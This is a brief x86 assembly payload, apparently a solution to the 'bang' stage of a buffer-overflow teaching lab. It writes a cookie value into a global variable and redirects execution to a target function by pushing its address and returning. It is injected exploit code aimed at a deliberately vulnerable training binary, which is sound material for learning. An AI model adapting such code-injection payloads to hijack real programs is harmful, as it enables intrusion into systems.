push $0x08048C9D	# Store address of bang function as return address
mov $0x6cf6dd37, %eax	# Store adminuser cookie in eax
mov %eax, (0x0804D100)	# Store adminuser cookie to global_value
ret			# return to bang function

